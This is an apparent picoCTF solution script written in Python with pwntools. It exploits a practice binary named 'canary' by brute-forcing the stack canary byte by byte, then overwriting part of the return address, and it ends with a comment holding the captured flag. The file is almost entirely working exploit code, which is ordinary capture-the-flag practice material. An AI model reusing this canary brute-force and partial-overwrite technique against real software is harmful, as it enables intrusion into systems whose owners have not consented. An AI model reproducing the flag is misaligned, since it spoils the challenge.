from pwn import *
context.log_level = 'critical'
payload = "A"*(0x20)
canary=''
for i in xrange(4):
	for j in xrange(255):
		p = process('./canary')
		p.sendlineafter('> ',str(len(payload)+1))
		p.sendlineafter('Input> ',payload + chr(j))

		if 'Stack Smashing Detected' not in p.recv():
			payload += chr(j)
			canary += chr(j)
			print repr(canary)
			break

payload = "A"*0x20 + canary 
payload = payload.ljust(0x34,'B')
payload += '\xed\x67'


while True:
	p = process('./canary')
	p.sendlineafter('> ',str(len(payload)))
	p.sendlineafter('Input> ',payload)

	x = p.recv()
	if 'p' in x:
		print x
		break

	p.close()

# picoCTF{cAnAr135_mU5t_b3_r4nd0m!_2a16c6a0}

# p.interactive()